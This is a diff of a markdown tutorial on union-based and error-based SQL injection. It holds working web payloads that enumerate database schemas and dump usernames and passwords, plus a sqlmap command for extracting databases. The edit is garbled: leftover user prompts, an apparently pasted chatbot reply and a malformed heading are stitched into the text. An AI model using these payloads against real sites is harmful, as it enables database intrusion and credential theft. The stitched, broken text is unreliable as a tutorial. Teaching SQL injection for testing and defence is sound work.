@@ -83,77 +83,52 @@ Union-based SQL injection leverages the UNION SQL operator to combine results fr
 4. Craft UNION SELECT to extract desired data
 
 **Example step-by-step:**
+continue from here
 
-1. Test for vulnerability:
-   ```sql
-   product.php?id=1'
-   ```
+ It looks like you're working on a document or tutorial related to **In-Band SQL Injection (SQLi)**. Let me help you continue from where you left off.  
 
-2. Find number of columns:
-   ```sql
-   product.php?id=1 ORDER BY 5-- 
-   ```
-   Increase number until you get an error (error at 5 means 4 columns)
+### **Continuing "01-In-Band-SQLi"**  
 
-3. Confirm with UNION:
-   ```sql
-   product.php?id=-1 UNION SELECT NULL,NULL,NULL,NULL--
-   ```
+In-Band SQL Injection is one of the most straightforward types of SQL injection, where the attacker uses the same communication channel to both launch the attack and retrieve results. There are two primary types:  
 
-4. Identify displayed columns by replacing NULLs one by one:
-  continue from step-by step
+1. **Error-Based SQL Injection**  
+   - The attacker deliberately triggers SQL errors to extract information from the database.  
+   - Example:  
+     ```sql
+     ' OR 1=CONVERT(int, (SELECT table_name FROM information_schema.tables))--
+     ```
+   - The error message might reveal table names or other sensitive data.
 
- # Continuing Step-by-Step Guide for In-Band SQL Injection (01-In-Band-SQLi)
+2. **Union-Based SQL Injection**  
+   - The attacker uses the `UNION` operator to combine results from a malicious query with legitimate ones.  
+   - Example:  
+     ```sql
+     ' UNION SELECT username, password FROM users--
+     ```
+   - This requires knowing the number of columns in the original query.
 
-## Step 4: Identifying Vulnerable Parameters
-1. **Test all input fields**: Try basic SQL injection payloads in:
-   - URL parameters (e.g., `?id=1`)
-   - Form fields (login/search)
-   - HTTP headers (User-Agent, Referer)
+#### **Example Attack Scenario (Union-Based)**  
 
-2. **Common vulnerable patterns**:
-   ```sql
-   ' OR 1=1 --
-   " OR 1=1 --
-   1' ORDER BY 1--
-   1' UNION SELECT null--
-   ```
-
-## Step 5: Determining Database Structure
-1. **Find number of columns**:
-   ```sql
-   ' ORDER BY 5-- 
-   ```
-   Increase number until error occurs to find column count
-
-2. **Identify useful columns**:
-   ```sql
-   ' UNION SELECT 1,2,3,4,5--
-   ```
-   Note which numbers appear in output
-
-## Step 6: Extracting Data
-1. **Get database version** (replace visible column number):
-   ```sql
-   ' UNION SELECT 1,@@version,3,4,5--
-   ```
-
-2. **List tables**:
-   ```sql
-   ' UNION SELECT 1,table_name,3,4,5 FROM information_schema.tables--
-   ```
-
-3. **Extract column names from interesting tables**:
-   ```sql
-   ' UNION SELECT 1,column_name,3,4,5 FROM information_schema.columns WHERE table_name='users'--
-   ```
-
-## Step 7: Retrieving Sensitive Data
-```sql
-' UNION SELECT 1,username||':'||password,3,4,5 FROM users--
+Suppose a vulnerable website has a URL like:  
+```
+http://example.com/products?id=1
 ```
 
-## Step 8: Automated Tools (Optional)
+An attacker could test for SQLi by injecting:  
+```
+http://example.com/products?id=1' UNION SELECT 1,2,3--
+```
+
+If successful, they might see numbers `1`, `2`, or `3` in the output, indicating column positions that can be exploited further.
+
+#### **Mitigation Techniques**  
+- Use **Prepared Statements (Parameterized Queries)** instead of dynamic SQL.  
+- Implement proper **Input Validation & Sanitization**.  
+- Apply **Least Privilege Principle** for database users.  
+
+Would you like me to expand on any specific part?
+
+1## Step 8: Automated Tools (Optional)
 Consider using sqlmap for more efficient exploitation:
 ```bash
 sqlmap -u "http://example.com/page?id=1" --dbs --batch
